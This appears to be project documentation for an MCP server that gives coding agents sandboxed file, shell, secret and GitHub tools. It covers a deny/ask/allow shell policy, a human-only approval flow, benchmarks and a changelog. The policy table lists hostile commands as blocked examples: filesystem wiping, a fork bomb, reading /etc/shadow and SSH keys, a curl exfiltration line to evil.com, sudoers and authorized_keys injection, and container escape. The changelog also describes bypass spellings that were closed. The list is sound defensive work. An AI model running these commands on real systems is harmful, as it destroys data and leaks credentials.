| Decision | Category | Examples | Rule IDs (from `lib/shell-policy.ts`) |
|---|---|---|---|
| **DENY** (hard block, never runs) | System destruction | `rm -rf /`, `rm -rf /*`, `:(){ :|:& };:` (fork bomb) | `filesystem_destruction`, `fork_bomb` |
| | Credential theft | `cat /etc/shadow`, `cat ~/.ssh/id_rsa`, `env \| grep -i password` | `credential_access`, `env_dump` |
| | Network exfiltration | `curl http://evil.com/$(cat /etc/passwd)`, `wget --post-file /etc/shadow` | `network_exfiltration` |
| | Process killing | `kill -9 1`, `pkill -9 -u root`, `taskkill /F /PID 1` | `process_kill_critical` |
| | Disk formatting | `mkfs.ext4 /dev/sda`, `format c:`, `dd if=/dev/zero of=/dev/sda` | `disk_format` |
| | Kernel/module | `insmod malicious.ko`, `rmmod security_module` | `kernel_module` |
| | Bootloader | `grub-install --force /dev/sda`, `efibootmgr -b` | `bootloader_modification` |
| | Firewall disable | `iptables -F`, `ufw disable`, `systemctl stop firewalld` | `firewall_disable` |
| | Audit disable | `auditctl -e 0`, `systemctl stop auditd` | `audit_disable` |
| | Sudoers tamper | `echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` | `sudoers_tamper` |
| | SSH key inject | `echo 'key' >> ~/.ssh/authorized_keys` (non-interactive) | `ssh_key_install` |
| | Cron/at inject | `echo 'cmd' >> /etc/crontab`, `at now <<< 'cmd'` | `cron_injection` |
| | Container escape | `docker run --privileged --pid=host`, `kubectl run --privileged` | `container_escape` |
| | PowerShell encoded | `powershell -EncodedCommand ...` | `powershell_encoded_command` |
| | Taskkill force | `taskkill /F /PID ...` | `taskkill_force` |
| | Dynamic execution | `eval`, `exec`, `source`, `bash -c`, `node -e`, `python -c`, `powershell -c` | `dynamic_execution` |
| **ASK** (requires human approval) | Git destructive | `git push --force`, `git push --force-with-lease`, `git reset --hard`, `git clean -fd` | `git_history_rewrite`, `git_push_force` |
| | Package install global | `npm install -g`, `pip install --user`, `cargo install` | `package_install_global` |
| | Docker/Podman run | `docker run`, `docker exec`, `podman run` | `container_control` |
| | Systemctl | `systemctl start/stop/restart`, `service start/stop` | `systemctl_control` |
| | Network tools | `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync` (to external) | `network_access` |
| | Write outside workspace | `echo > /etc/file`, `tee /root/file` | `write_outside_workspace` |
| | Shell risky builtins | `exec`, `source`, `.`, `eval`, `trap` | `shell_risky_builtin` |
| | Python/Ruby/Node eval | `python -c`, `ruby -e`, `node -e`, `perl -e` | `dynamic_execution` |
| | Sudo/su | `sudo cmd`, `su -c` | `privilege_escalation` |
| | Package manager | `apt install`, `yum install`, `brew install`, `choco install` | `package_manager` |
| | Archive extract | `tar -xzf`, `unzip` (absolute paths) | `archive_extract` |
| | Symlink create | `ln -s /etc/passwd ./link` | `symlink_create` |
| | Chmod/chown recursive | `chmod -R 777 /`, `chown -R user: /` | `permission_change_recursive` |
| **ALLOW** (auto-run) | Git safe | `git status`, `git diff`, `git log`, `git add`, `git commit`, `git branch`, `git show` | — |
| | Read-only | `cat`, `less`, `head`, `tail`, `grep`, `find`, `ls`, `stat`, `file` | — |
| | Workspace write | `echo > ./file`, `cp ./a ./b`, `mkdir -p ./dir` (inside workspace) | — |
| | Node/JS safe | `node script.js`, `npm test`, `npm run build` (no `-e/--eval`) | — |
| | Python safe | `python script.py`, `pytest` (no `-c`) | — |
| | Build tools | `make`, `cargo build`, `go build`, `gradle build` | — |

> **Mnemonic:**  
> - **DESTROY system/data/credential** → **DENY**  
> - **MODIFY state outside workspace / external effect** → **ASK**  
> - **READ / WORKSPACE-LOCAL WRITE** → **ALLOW**

#### 6.1.2 Override mechanism

`VENIRA_SHELL_OVERRIDES` (operator allowlist) + per-call `override` name + non-empty `reason`:

| Override | Effect | Still blocked |
|---|---|---|
| `ALLOW_GIT_PUSH` | Allows one `git push --force` with explicit `reason` | Other git history rewrites, protected files |
| `ALLOW_ENV_READ` | Allows one read of in-workspace `.env`/`.env.*` | Writes, pipes, redirects, credential stores |

Both are recorded in SQLite audit log; neither can be activated by the agent alone.

The exact list of ask / deny rules is documented in `lib/shell-policy.ts` and can be overridden by a JSON file at **`VENIRA_SHELL_POLICY_FILE`**:
```jsonc
{
  "mode": "balanced",
  "allow": [{ "command": "npm", "subcommands": ["ci", "test"] }],
  "ask": [{ "command": "git", "subcommands": ["push"], "reason": "Can rewrite history" }],
  "deny": [{ "command": "sh", "args_regex": ".*\\|.*\\s+curl.*" }]
}
```

`ALLOW_GIT_PUSH` can be enabled by the operator in `VENIRA_SHELL_OVERRIDES` and then passed on a single `git push` call with a non-empty `reason`. `ALLOW_ENV_READ` permits only one simple read of an in-workspace `.env`/`.env.*` file. Both are recorded in the SQLite audit log; neither can be activated by the agent alone. Protected stores, private keys, writes, pipes, redirects, command chains, and hard-deny rules remain blocked.

All Venira boolean environment flags and MCP tool boolean arguments use numeric `0`/`1` only. Legacy spellings such as `true`, `false`, `yes`, or `on` are rejected. Tool arguments are JSON numbers (`1`/`0`), not strings. `project_ci_trigger.inputs` remains provider data and may contain JSON booleans. Existing clients using boolean tool arguments must migrate before upgrading.
The policy is **never read from the workspace** itself (a cloned repo cannot ship a permissive config).

Approval flow (what the UI sees)

1. An agent calls `project_shell_run`. The server evaluates the command.
2. If the result is `deny` → an `approved: false` envelope with `code: "command_denied"` (non‑retryable).
3. If the result is `ask` → an `approved: false` envelope with:
   - `code: "approval_required"`
   - `data.approval_id`, stored in the per-user data directory
   - `data.rule` and `data.reason` (human-readable)
   - `data.retry_with.tool` and `arguments.approval_id`
   - an HMAC grant bound to the exact command, shell, cwd, sorted `secret_env` and rule
4. The user approves interactively with `npx --yes venira-mcp@latest --approve <id>` in a real terminal, optionally adding `--session` and `--yes`. `--approve` is deliberately not an agent/tool action.
5. The UI retries `project_shell_run` with `approval_id`. Session grants are limited to `cd_outside_workspace` unless explicitly extended with `VENIRA_SESSION_GRANT_RULES`; they do not apply to `network_access` or `git_history_rewrite` by default.
6. Clients advertising MCP elicitation may opt into an interactive prompt with `VENIRA_SHELL_ELICIT=1`. The legacy `VENIRA_SHELL_AUTO_APPROVE_TOKEN=1` mode returns a short-lived token to the model and should only be used in trusted, disposable environments.

Approvals are per-session, per-rule, and bound to the exact command, shell, cwd and secret names.
The approval key and pending/granted files live under `VENIRA_DATA_DIR/approvals`, not under
`<cwd>/data`. The HMAC prevents forged or cross-command grants; grants are single-use unless a
human explicitly chooses the allowed session scope.

Runtime hardening (all modes)

- Process tree kill: timeouts and cancellations invoke `killTree()`, which on Windows uses `taskkill /F /PID /T` and on POSIX sends `SIGKILL` to the whole group. This prevents children (e.g., `npm test` → test runner) from surviving after the parent timeout.
- Output cap: by default 1 MiB per stream. Surplus is dropped and reported via `dropped_bytes`. Helps runaway builds from exhausting server memory.
- Environment whitelist: by default the shell inherits only `PATH`, `HOME`, `TERM`, `CI`, and a few other safe variables. Set `VENIRA_SHELL_ENV_PASS_ALL=1` or `VENIRA_SHELL_ENV_ALLOW=VAR1,VAR2` to broaden this.
- Timeout clamp: a caller can specify `timeout_ms`. The server caps it at `VENIRA_SHELL_MAX_TIMEOUT_MS` (default 30 min) and kills the process tree when exceeded.

Audit coverage (all shell calls)

Every shell command run is logged in `project_tool_audit` with columns:
- `decision` ("deny" | "ask" | "allow")
- `policy_rule` (e.g., `deny.pipe_download_to_shell`, `ask.cd_outside_workspace`)
- `command` (redacted for secrets)
- `approver` ("pending" | "user:token" | "user:session")

Audit reasons (all mutations)

Mutating tools (`project_write_file`, `project_edit_file`, `project_create`, `project_create_directory`,
`project_delete_path`, `project_snapshot`) accept an optional `reason` string — *why* the change was made
(e.g. `"sua loi null pointer o dong 45"`). It is normalized to a single line, secrets are redacted, the
length is capped at 400 chars, and it is stored in the additive `reason` column of `project_tool_audit`
(old DBs are migrated in place). `project_read_audit` returns the field, so a later session can ask
"what changed and why" without re-reading the diff.

```jsonc
project_edit_file({ relative_path: "src/auth.ts", old_text: "value == null", new_text: "value == null → guard",
                    reason: "fix null pointer at line 45" })
project_read_audit({ session_id: "…", operation: "edit_file" })
// → rows: [{ operation: "edit_file", outcome: "succeeded", reason: "fix null pointer at line 45", … }]
```

A long‑running command that times out or is killed is recorded with `reason_code: "timed_out"` (or `output_capped`). The `project_health` output includes `shells.policy` (mode, builtin rule counts) and `shells.policy.stats` (evaluated/asked/denied/approved/timed_out).

### 6.2 Secrets and outbound network (GitHub / CI)

These are the only two surfaces that leave the workspace, so they are deliberately narrow.

**Secrets.** `project_secret` is a small credential vault, not a config file:

1. `set` encrypts the value (AES-256-GCM, random IV per write) into `secrets.json` under the data
   dir, and writes the key to `secrets.key` (`0600`, temp file + rename) on first use. Prefer
   `value_env` so the value comes from the host environment and never appears in a tool call.
2. `get` / `list` return **metadata only** — name, byte length, `sha256_12`, `updated_at` — enough
   for an agent to confirm a credential exists without putting it in the transcript.
3. Plaintext is returned only when the caller passes `reveal=1` **and** the host sets
   `VENIRA_SECRET_ALLOW_REVEAL=1`; otherwise it fails with `reveal_denied`.
4. `project_shell_run secret_env: ["NAME"]` always requires human approval, then decrypts and adds
   the value to the child's environment. Direct occurrences in command/audit text and captured
   output are scrubbed when possible; this cannot prevent a script from encoding or exfiltrating
   a secret. Review the command and script before approving.
5. Names are allow-listed (`[A-Za-z_][A-Za-z0-9_]{0,63}`) and loader-hijack names
   (`NODE_OPTIONS`, `LD_PRELOAD`, `DYLD_*`, `PYTHONSTARTUP`, `PYTHONPATH`, `BASH_ENV`, `ENV`,
   `PROMPT_COMMAND`, `GIT_SSH_COMMAND`) are refused. `secrets.json` / `secrets.key` are excluded
   from checkpoints, restores and `delete_extra`.

**Network.** `project_pr_*` and `project_ci_*` talk to GitHub over `node:https`:

- `VENIRA_NETWORK=0` → every call returns `network_disabled` before a socket is opened.
- `VENIRA_GITHUB_API_URL` must be `https:` (http is accepted only for `localhost`/`127.0.0.1`
  test mocks, or when `VENIRA_GITHUB_ALLOW_HTTP=1` is explicitly set).
- Redirects are followed manually (max 5). The `Authorization` header is attached only while the
  request targets the API origin, so GitHub's 302 to a pre-signed log blob does not leak the token.
- Every request has a timeout; responses are size-capped; log archives are parsed in memory
  (32 MB archive / 4 MB entry / 8 MB text) with no extraction to disk.
- Errors are shaped for recovery: `auth_missing`, `auth_failed`, `not_found`, `conflict`,
  `rate_limited`, `forbidden`, `network_error`, `timeout`, `resource_limit`.

---

## 7. Benchmark

Numbers below are from the current Windows workspace / Node 24.20.0 run, standalone build, 2026-11-01.
See [`benchmarks.md`](./benchmarks.md) for the full table and historical comparison.

### 7.1 End-to-end MCP (`npm run bench:mcp`)

| Scenario | avg | p50 | p95 | max |
|---|---|---|---|---|
| **First call** (post warm-up) | — | **113.7 ms** | — | — |
| `project_read_file` ×50, same file (cached) | 13.14 ms | 8.00 ms | 53.59 ms | 74.48 ms |
| `project_read_file` ×8, distinct files | 9.50 ms | 8.83 ms | 16.09 ms | 16.09 ms |
| `project_read_batch` ×3 (8 items each) | **16.55 ms** | 12.83 ms | 26.72 ms | 26.72 ms |
| `project_get_file_info` ×30 | 11.34 ms | 6.22 ms | 33.39 ms | 69.93 ms |
| `project_search` ×10 (literal content) | 156.58 ms | 11.45 ms | 1347.66 ms | 1347.66 ms |
| `project_read_ranges` (2 ranges) | 229.4 ms | — | — | — |
| `project_recent_files` | 100.6 ms | — | — | — |
| `project_health` (no DB query) | **28.5 ms** | — | — | — |

> **Reading the batch row:** 8 distinct reads cost **16.6 ms total** as one batch call,
> vs. ~8 × 9.5 ms ≈ 76 ms issued individually. That is the round-trip saving the decision
> tree in [§4.10](#410-how-the-model-is-told-to-pick-the-right-tool) is designed to exploit.

> These are one Windows/Node 24.20.0 observation, not a performance guarantee. Search and
> process startup are sensitive to host load; use repeated runs on the target machine before
> comparing releases.

### 7.2 In-process tier (`npm run bench`)

| Scenario | Value |
|---|---|
| Direct first read (cold, includes capability open) | 19.96 ms |
| `read_file` sequential ×50 | avg 0.72 ms · p50 0.59 ms · p95 1.88 ms |
| 8-file batch sequential | 11.0 ms total |
| Parallel ×8 | 2.9 ms total |
| `get_file_info` ×50 | avg 0.30 ms |
| `list_files` | 12.7 ms |
| `search` (literal, `*.ts`) | 9.8 ms |
| `shell_run` + `shell_status` round-trip | ~930 ms (2 s wait budget dominates) |

### 7.3 Rust-backend v0.3.0 → standalone v1.0.0

| Metric | v0.3.0 (Rust IPC) | v1.0.0 (standalone) | Why |
|---|---|---|---|
| First MCP call | 6.3 ms | **2.5 ms** | No subprocess spawn |
| Cached read p50 | 2.57 ms | **1.01 ms** | In-process file I/O |
| 8-file batch avg | 19.11 ms | **4.18 ms** | No IPC + no audit lock |
| `project_health` | 5.5 ms | **1.8 ms** | In-process |
| Install surface | Rust binary + Node | **Node only** | `npm install` is the whole setup |

---

### 7.4 Token savings (vs. shell + manual parsing)

Typical 30-min coding agent session — estimated tokens consumed:

| Scenario | Without Venira (shell + parse) | With Venira (typed MCP) | Savings |
|---|---|---|---|
| Read 8 distinct files | 1,200 | 200 | **83%** |
| Read same file 50× (cached) | 7,500 | 1,130 | **85%** |
| Search 10 queries | 3,000 | 1,200 | **60%** |
| GitHub PR create | 500 | 80 | **84%** |
| Rollback 20 files (snapshot) | 5,000 | 100 | **98%** |
| List + read 5 files | 800 | 180 | **78%** |
| **TOTAL** | **~18,000** | **~2,890** | **~84%** |

> **Why:** Batch APIs eliminate per-call overhead; LRU cache serves hot reads in ~20 tokens; structured JSON output avoids stdout/stderr parsing; built-in GitHub tools skip `gh` CLI round-trips; snapshot rollback replaces 20-file manual edits with 1 call.  
> At $15/M tokens (Claude 3.5 Sonnet), this is ~$0.18/session → ~$1,300/year per agent at 20 sessions/day.

---

## 8. Envelopes, hints, and error codes

Every success and every failure is a single JSON object. On failure, the MCP result has
`isError: true` and the envelope looks like:

```jsonc
{
  "ok": false,
  "status": "failed",
  "request_id": "…",
  "kind": "read_file",
  "error": {
    "code": "not_found",
    "message": "Path does not exist: .verify-tmp/missing.txt",
    "retryable": false
  },
  "hint": "Check the path with project_list_files or project_search first; do not retry the same path.",
  "elapsed_ms": 4.12
}
```

Errors that can be recovered programmatically may also include bounded `data` and
`next_actions`. For example, `old_text_ambiguous` returns up to five match locations
with short context; `stale_content` returns the current SHA-256 and mtime. Protected
path failures never include file contents. The regression suite checks these limits.
`project_health` also reports repeated failed calls with the same argument fingerprint
in `audit.loop_failures` (last 10 minutes, bounded to 20 groups); only SHA-256
fingerprints are stored, never raw arguments.
It also reports `audit.adoption_runs` when three or more successful single-file reads
or edits occur consecutively within 60 seconds, suggesting `project_read_batch` or
`project_edit_batch`; this is observational only and does not alter tool behavior.

| `error.code` | `retryable` | What it means |
|---|---|---|
| `not_found` | ✗ | Path does not exist |
| `invalid_request` | ✗ | Bad argument names/types |
| `old_text_not_found` | ✗ | Exact edit text is absent — re-read and copy the current text |
| `old_text_ambiguous` | ✗ | Edit text matches multiple locations — add context or set `replace_all` |
| `stale_content` | ✗ | `expected_sha256` does not match the current file |
| `conflict` | ✓ | Legacy conflict code retained for compatible operations |
| `path_escape` | ✗ | Path outside the workspace (use `VENIRA_UNRESTRICTED=1` to opt out) |
| `scope_denied` | ✗ | Capability / permission mismatch |
| `resource_limit` | ✗ | Batch item too large or response budget exhausted — narrow the request |
| `io_error` | ✓ | File locked or disk busy — retry once |
| `audit_unavailable` | ✗ | Audit row could not be written — stop retrying |
| `capability_expired` | ✓ | Scope re-opens automatically on next call — retry once |
| `host_timeout` | ✓ | Backend didn't answer in time — check `project_health`, retry once |
| `host_unavailable` | ✓ | Backend is unavailable; it recovers on the next call — retry once |
| `sensitive_result` | ✗ | Content withheld by policy — do not retry or work around it |
| `unsupported` | ✗ | Operation unavailable in current permission mode |
| `internal` | ✗ | Unexpected error — check `project_health` and stderr |

Hints are **actionable next steps**, not prose: "Next chunk: `project_read_file({ relative_path:
"src/foo.ts", start_line: 1000 })`", "Poll `project_shell_status({ run_id: "r123", wait_seconds: 5 })`",
etc. The model is expected to read `hint` first.

---

## 9. What this project does well & what it does not

**Strengths**

- **Speed at the MCP layer.** ~2.5 ms first call, ~1 ms p50 cached reads, ~4.2 ms for an
  8-file batch. The in-process backend removes the IPC hop and the audit lock contention
  that dominated the v0.3.0 (Rust) profile.
- **Zero install friction.** `npm install && npm run build` is the entire setup. No Rust
  toolchain, no prebuilt binary, no database server.
- **Correctness of reads.** mtime+size validation normally detects external edits or deletes
  before cached content is returned; it is not a filesystem transaction or watcher.
- **Self-diagnosis.** `project_health` + `doctor.ts` + `verify.ts` give three independent
  viewpoints: runtime state, preflight, and behavioural regression.
- **Audit-grade traceability.** Every op, including failures and cancellations, lands in a
  SQLite table tagged by session — useful for post-mortems on what an agent actually did.
- **Agent-friendly contracts.** Envelopes, hints, `_meta` annotations, and a decision-tree
  `instructions` block mean the model rarely has to guess.

**Limitations (be honest about these)**

- **macOS CI-only, not dev-tested.** CI runs on `macos-latest` (x64 + arm64) for both Node
  20 and 22, but no developer has day-to-day macOS. Path handling is POSIX-correct
  (verified on Linux), but Spotlight / Gatekeeper / SIP quirks are untested.
- **No git/diff tooling yet.** ~~`project_diff_files`, `project_file_symbols`, and
  `project_symbol_references` are on the roadmap~~ → **now implemented** in v1.3.0 (P2/P3)
  — see [`TODO.md`](./TODO.md).
- **Search is a line scanner, not an index.** `project_search` reads every file in scope
  (bounded at 1 MiB/file) and matches line-by-line. It's fine for typical project sizes;
  for a monorepo with thousands of files, p95 will climb.
- **`project_recent_files` is index-first, scan-fallback.** It prefers the SQLite
  `project_file_index` (maintained on write/edit/delete); when the index is empty it
  falls back to a bounded scan capped at 4 000 files / 300 directories, skipping
  `node_modules`, `target`, `dist`, `.git`, etc.
- **Shell output is bounded.** The default async response returns bounded stdout/stderr tails,
  not a live stream. With `background: 0`, the call blocks until
  the process exits and its stdio flushes, then returns bounded `stdout`/`stderr`; long
  outputs are still capped by design. A foreground call is bounded by `timeout_ms`
  (default 10 minutes), but the MCP client may impose a shorter request timeout — use the
  async path plus polling for runs that could outlive the client budget.
- **One workspace per server instance.** The workspace, data dir, and permission mode are
  fixed at process start. To serve multiple workspaces concurrently, run multiple instances.
- **`better-sqlite3` is a native module.** Prebuilt binaries cover the common Node ×
  platform × arch combos (Node 20/22 on Linux x64/arm64, macOS x64/arm64, Windows x64).
  Unusual platforms (musl, Alpine, ARM Windows, exotic archs) will compile from source
  on `npm install` and need `python3` + a C compiler. The Docker image and the
  standalone `.zip` in the release sidestep this entirely.

---

## 10. Interesting details & things you should know

- **Serial queue, by design.** The MCP layer funnels every `execute` through a promise
  queue so the SQLite audit writer is single-threaded. `shell_status` and `cancel` are
  deliberately *unqueued* so a long poll never blocks anything else.
- **Warm-up races the MCP handshake.** `warmUp()` opens the capability scope immediately
  and in parallel with `server.connect()`. The first tool call therefore costs ~2.5 ms
  instead of ~20 ms (capability open alone is ~17 ms).
- **Search cache is asymmetric on purpose.** A search that *found* hits is cached (TTL 3 s).
  A search that *found none* is not — because the absence of a hit is exactly what can
  become stale the instant a file is written. (`verify.ts` guards this with
  `search_cache_invalidated`.)
- **`project_recent_files` is index-first, scan-fallback.** P2 added a SQLite
  `project_file_index` (maintained on write/edit/delete). The tool queries it first
  (`source: "index"`); when empty it falls back to bounded BFS with `readdir` + `stat`
  in chunks of 64 (`source: "fallback_scan"`), symlinks skipped, ignored dirs pruned,
  results sorted by mtime descending. The `session_edits` field additionally lists files
  *this* session wrote (up to 20), so the model knows what it already touched.
- **Code intelligence is regex/LCS, not an indexer.** `project_outline_symbol`,
  `project_file_symbols`, `project_diff_files`, `project_symbol_references`, and
  `project_selective_search` all run over plain UTF-8 text in `lib/symbol-diff.ts` —
  no external indexer, safe on any workspace file.
- **Fuzzy edit is opt-in and audited.** `VENIRA_EDIT_FUZZY=1` makes `opEditFile` fall
  back to a Levenshtein match when the exact `old_text` is not found; the envelope
  sets `fuzzy_used: true` so the audit trail records it.
- **P1 observability surfaces.** `project_health` now reports `cache` / `trace` / `shell`
  config sections; `project_trace_status` returns the in-memory trace ring;
  `project_read_audit` reads the SQLite audit log directly (bounded, WAL-safe,
  `audit_unavailable` fallback).
- **Audit DB is inspected read-only.** `project_health` opens `venira.db` with
  `readonly: true` via `better-sqlite3` and counts rows for the session, including
  `orphan_running` (rows stuck at `running` — a sign of an unclean shutdown).
- **Metrics are ring buffers, not histograms.** `lib/metrics.ts` keeps the last 256
  samples per operation (p50/p95/max/avg). Deliberately tiny: the goal is "what happened
  this session", not "90-day SLO tracking".
- **Output modes are cheap.** `compact` replaces payloads over 8 KB with previews and a
  `summary` object. The
  model can request full data back via a follow-up call when it truly needs it.
- **Shutdown is defensive.** On `SIGINT`/`SIGTERM`/stdin close the server cancels all
  running shells, closes the scope, and marks the audit DB cleanly — no orphans, no stuck WAL.

---

## 11. Development workflow

```bash
npm run build        # type-check + emit dist/
npm run smoke        # in-process sanity (backend reachable, path lock works)
npm run doctor       # preflight: 12 checks incl. audit DB, shell smoke, P1 config surface
npm run verify       # behavioral + security regressions: MCP, shell policy, provider-secret guard, GitHub OAuth
npm run test:policy-corpus # 255 deterministic shell-policy cases
npm run bench        # in-process numbers
npm run bench:mcp    # end-to-end numbers
```

`better-sqlite3` ships a Node-ABI-specific native addon. Run `npm ci` under each Node
runtime you use; if you switch Node versions while keeping `node_modules`, rebuild it with
`npm rebuild better-sqlite3` before testing. Do not copy the compiled addon between runtimes.

**Adding a new tool**

1. Register it in `tools/project.ts` with `registerProjectTools` — use the `config()` helper
   so `Use when` / `Avoid when` / `Speed` / `Output` / `Batch-safe` land in the description
   *and* in `_meta.venira`.
2. Read-only ops: route through `executeCached` so they automatically participate in
   cache invalidation (mutations wipe list/search/recent caches).
3. New backend ops: add the handler in `lib/corehost.ts` under `operations`, and add an
   audit row (or mark it read-only like `shell_status` if it's a long poll).
4. Add a case to `scripts/verify.ts` (the suite already checks instruction blocks,
   annotations, envelope shape, and audit rows for new tool names).
5. Update the decision tree in `server.ts` (`INSTRUCTIONS`) and the tool table in
   `README.md`.

**Testing conventions**

- `verify.ts` uses a fixed `VENIRA_SESSION_ID` so its audit rows are separable from real
  sessions.
- `bench.ts` uses a unique `request_id` tag per run — the audit table has a UNIQUE
  constraint on `request_id`, and reusing one across runs would produce
  `audit_unavailable`.
- Do not commit to `dist/`, `node_modules/`, `test/`, or `*.log` (see `.gitignore`).

---

## 12. Troubleshooting

| Symptom | First things to check |
|---|---|
| `not_found` on a path that looks fine | Run `npm run doctor`; confirm `VENIRA_WORKSPACE` points where you think. |
| `path_escape` on a path that looks fine | The path contains `../` that resolves outside the workspace. Use a workspace-relative path; set `VENIRA_UNRESTRICTED=1` only when you truly need it. |
| Read cache seems stale | It should not — reads are mtime+size validated. If you see it, check that the filesystem timestamp updates (some network drives delay `mtime`). |
| Shell command not finishing | `project_shell_status` with `wait_seconds: 30`; check `project_health` → `shells.active` to see which `run_id` is still running. |
| `better-sqlite3` build failure on install | You're on an unusual platform (musl, exotic arch). Run `npm rebuild better-sqlite3` with build tools (`python3`, `make`, `g++`), or use the Docker image / prebuilt standalone zip instead. |
| `npx --yes venira-mcp@latest` not found | Check npm registry access / the package name. For a local build, use `node <repo>/dist/server.js`. |
| `venira.db` won't open in `project_health` | Another process has the WAL locked; make sure only one server instance writes to the same data dir. |
| Everything slow | Run `project_health` — `queue.depth`, `pending_requests`, and per-op p95 will tell you if it's a bottleneck or a stuck command. |

---

## 13. Contributing

1. Fork and clone; `npm install && npm run build && npm run doctor`.
2. Read [`TODO.md`](./TODO.md) — P1 (cache control, tracing, audit, shell UX) and
   P2/P3 (code intelligence, fuzzy edit, recent-files index) are complete; the next
   milestone is `project_explain_error` / `project_plan_read_batch` (deferred, need LLM).
3. Keep the invariants from [§10](#10-interesting-details--things-you-should-know):
   serial queue for `execute`, long-lived capability, asymmetric search cache, bounded scans.
4. Add a `verify.ts` check for every new tool; keep the suite green before opening a PR.
5. Run `npm run bench:mcp` and paste the numbers in the PR description when touching
   `tools/project.ts` or `lib/corehost.ts`.

---

## 14. Changelog & roadmap

The full history, in order — from the standalone rewrite to the provider, secrets, diagnostics and planning releases.

### 14.1 Timeline

| Date | Version | Milestone |
|---|---|---|
| 2026-11-05 | **Unreleased (v1.14.0)** | **Rust support + per-mode tools + cache fixes.** `project_dependency_graph` / `project_change_impact` now parse Rust: crate roots via `main.rs` / `lib.rs`, `mod foo;` / `pub mod`, `use crate::` / `super::`, `extern crate`; longest-existing-prefix resolution, raw strings, nested block comments, char-vs-lifetime literals; test files detected via `benches/` and `*_test.rs`. Checkpoints skip Rust artifacts (`target/`, `**/*.pdb`, `*.d`) so the 512 MiB cap is not wasted. Shell-output redaction also covers `DATABASE_URL` / `GITHUB_TOKEN`-style env assignments and `env::var("NAME")` patterns. `venira.config.json` gains per-workspace `snapshot.maxFiles` (may raise `VENIRA_SNAPSHOT_MAX_FILES`; hard ceiling 20 000). New **tool modes**: `VENIRA_TOOL_MODE=default` (lean coding set, 31 tools — no shell, no JS eval, no CI/CD shipping, no destructive `project_delete_path`) or `expert` (full surface, 46; 47 with `VENIRA_ALLOW_JS_EXEC=1`); settable via env or `toolMode` in `venira.config.json`. Capability scope is **refreshed proactively** (reopens at half its 2 h TTL — no more first-call `capability_expired`); `project_health` reports `open|refreshing|expired` truthfully; `project_create` now participates in cache invalidation; `project_symbol_references(scope:"workspace")` is served by a dedicated 3 s cache invalidated on writes (bench: warm ≈ 0.74 ms); `project_health.caches` reports `negative.ttl_ms`/`oldest_age_ms` and `references.*`; **hybrid search**: `project_search({hybrid: 1})` tags each hit with `source` + `confidence` (definition sites detected with the same parser-lite as `project_outline_symbol`), zero-hit scoped identifier queries widen once to the workspace (`scope_widened: true`). The shell output cache now stores **only genuinely read-only commands**, decided on the parsed argv (git read subcommands, `rg`, `ls`, file readers, version probes; compound commands `>|;&` are never cached) — previously every successful command including `git push` was cached with a `cache.hit` allow decision. **Symbol extraction fixed everywhere** (`project_outline_symbol`, `project_file_symbols`, hybrid `symbol_index` tags): identifiers come from the final capture group, with fixture matrix coverage for TS/Rust/Python/Go (`export default class`, `export enum`, TS/JS class methods — `async getToken(): Promise<string> {` incl. `static`/`get`/`set`/`constructor` with a control-flow blocklist, Rust `pub(crate)`/`pub(super)`, `impl Trait for Target`, `impl<T>`, `macro_rules!`, `const`/`static`, Python `async def`, Go receiver methods and generics) — previously `pub fn compute_stats` was reported as name `fn`, and TS plain `export async function` lines were not detected at all. **Shell runs no longer lose output**: async (`background` default) runs discarded stdout/stderr tails forever — tails were trimmed once at spawn, before the child produced output, and on Windows `exit` can fire before stdio flushed; tails are now trimmed at status-read time and at `close`, and the shell cache can no longer be poisoned with empty output (cache write moved to `close`). Hybrid search now tags definition sites in TS/Rust/Python/Go end-to-end (verify covers them). `ROADMAP.md` tracks the phased plan (A shipped, B shipped, C shipped, D shipped). verify **406 checks**. |
| 2026-11-03 | **v1.12.2** | **Code Mode rules in Agent instructions.** README [§3.4](#34-recommended-setup-for-agents-copy-paste) adds a `Code Mode rules` block for the OpenCode `execute` tool: `search()` is synchronous (never await, always pass an object), `tools.*` calls return Promises (always await), and on `SchemaError` / `un-awaited Promise` fix the call shape once instead of retrying identical code. Documentation only; **44 tools**, verify **378/378**. |
| 2026-11-02 | **v1.12.1** | **Agent setup profiles.** New README [§3.4](#34-recommended-setup-for-agents-copy-paste): one recommended environment profile (workspace lock on, `balanced` shell policy, complete envelopes, exit-early status polling, JS execution off with per-call approval, self-install off, one shared vault) rendered for OpenCode, VS Code, Claude Desktop/Cursor/Kimi/DeepSeek/Antigravity and Codex TOML, plus a copy-paste `AGENTS.md` block that tunes tool selection (plan first, batch reads, edit over rewrite, snapshot before bulk changes, follow hints). `opencode.example.json` mirrors the profile. Documentation only; **44 tools**, verify **378/378**. |
| 2026-11-02 | **v1.12.0** | **Per-call approval for `project_execute_js`.** Enabling the tool is no longer enough: with `VENIRA_JS_EXEC_APPROVAL=1` (the default) the first call returns `approval_required` with an `approval_id`, and a human grants that exact code + `argv` with `npx venira-mcp --approve <id>` before the agent retries. Grants are single-use and bound to the snippet, so an id cannot be replayed for different code; `VENIRA_JS_EXEC_APPROVAL=0` restores the previous behaviour for trusted automation. Pending approval records now record the retry tool, so the approver CLI tells the user to retry `project_execute_js` instead of `project_shell_run`. **44 tools**, verify **378/378**. |
| 2026-11-02 | **v1.11.0** | **Pentest hardening.** Protected files can no longer be read through the code-intelligence readers: `readTextFile()` now runs the shared `isProtectedPath()` guard, so `project_symbol_references` (`scope: "file"`) and `project_selective_search` (`files_hint`) return `sensitive_result` instead of plaintext. `isProtectedPath()` normalises NTFS alternate data streams (`file::$DATA`) and trailing dots/spaces before matching, closing the `.env::$DATA` spelling. Shell policy gained `ask.unresolved_file_argument`: any file-reading/writing command whose path is assembled at run time (`$VAR`, `${HOME}`, `%VAR%`, brace expansion, PowerShell `('.e'+'nv')`) now needs approval instead of falling through to `default_allow`; `${VAR}` forms also count as outside-workspace reads. `project_delete_path` refuses to delete the workspace root or an ancestor (`invalid_request`, no undo). `project_execute_js` redacts stdout/stderr and blocks global network APIs plus CommonJS net modules. **44 tools**, verify **374/374**, policy corpus **270/270**. |
